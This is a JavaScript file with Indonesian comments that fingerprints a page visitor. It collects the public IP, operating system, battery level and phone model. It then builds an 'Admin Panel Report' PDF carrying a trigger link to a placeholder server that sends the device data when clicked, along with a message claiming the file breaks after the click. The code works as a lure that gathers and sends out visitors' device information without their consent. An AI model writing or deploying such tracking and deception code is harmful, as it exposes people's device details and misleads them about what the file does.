async function fetchIP() {
    try {
        let response = await fetch('https://api64.ipify.org?format=json');
        let data = await response.json();
        document.getElementById('ip').innerText = data.ip;
    } catch (error) {
        document.getElementById('ip').innerText = "Gagal mengambil IP";
    }
}

function getOS() {
    let userAgent = navigator.userAgent;
    let os = "Tidak Diketahui";
    if (userAgent.includes("Windows")) os = "Windows";
    else if (userAgent.includes("Mac")) os = "MacOS";
    else if (userAgent.includes("Linux")) os = "Linux";
    else if (/Android/.test(userAgent)) os = "Android " + navigator.userAgent.match(/Android (\d+\.\d+)/)[1]; // Menambahkan versi Android
    else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS " + navigator.userAgent.match(/OS (\d+_\d+)/)[1].replace('_', '.'); // Versi iOS
    document.getElementById('os').innerText = os;
}

function getBatteryStatus() {
    navigator.getBattery().then(function(battery) {
        document.getElementById('battery').innerText = Math.round(battery.level * 100) + "%";
    });
}

function getDeviceModel() {
    let userAgent = navigator.userAgent;
    let model = "Tidak Diketahui";
    if (/Android/.test(userAgent)) {
        model = userAgent.match(/Android.*; (.*?) Build/)[1] || "Model tidak diketahui";
    } else if (/iPhone|iPad|iPod/.test(userAgent)) {
        model = "Apple " + userAgent.match(/iPhone|iPad|iPod (.*) like/)[1];
    }
    document.getElementById('device').innerText = model;
}

// Fungsi untuk membuat PDF dengan link pemicu
function downloadPDF() {
    const { jsPDF } = window.jspdf;
    let doc = new jsPDF();
    doc.text("Admin Panel Report", 10, 10);
    doc.text("IP: " + document.getElementById('ip').innerText, 10, 20);
    doc.text("OS: " + document.getElementById('os').innerText, 10, 30);
    doc.text("Model HP: " + document.getElementById('device').innerText, 10, 40);
    doc.text("Status Baterai: " + document.getElementById('battery').innerText, 10, 50);
    doc.text("Status Web: Online", 10, 60);
    
    // Link yang akan mengirim informasi ke server saat diklik
    let link = "https://yourserver.com/submit_info?device=" + encodeURIComponent(document.getElementById('device').innerText);
    doc.text("Klik untuk Kirim Info ke Server (Data akan langsung dikirim): " + link, 10, 70);
    
    // Simulasi PDF rusak setelah link diklik
    doc.text("File ini tidak bisa dibuka lagi setelah diklik.", 10, 80);
    
    doc.save("admin_report.pdf");
}

fetchIP();
getOS();
getBatteryStatus();
getDeviceModel();
